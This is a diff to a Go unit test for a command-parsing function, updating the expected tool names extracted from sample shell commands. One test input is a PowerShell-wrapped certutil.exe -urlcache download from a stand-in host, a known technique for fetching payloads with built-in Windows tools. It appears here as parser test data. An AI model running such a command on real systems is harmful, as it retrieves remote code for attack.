@@ -283,7 +283,7 @@ func TestExtractCommandChoosesTheShell(t *testing.T) {
 		{"nmap -sV 10.0.0.5 | tee out.txt", []string{"nmap", "tee"}},
 		{"apt-get install -y nmap", []string{"apt-get"}},
 		{"Get-ADUser -Filter * | Export-Csv users.csv", []string{"get-aduser", "export-csv"}},
-		{`pwsh -c "certutil.exe -urlcache -f http://a.example/x"`, []string{"certutil.exe"}},
+		{`pwsh -c "certutil.exe -urlcache -f http://a.example/x"`, []string{"certutil.exe", "pwsh"}},
 	}
 	for _, c := range cases {
 		if got := toolNames(ExtractCommand(c.text)); !slices.Equal(got, c.want) {
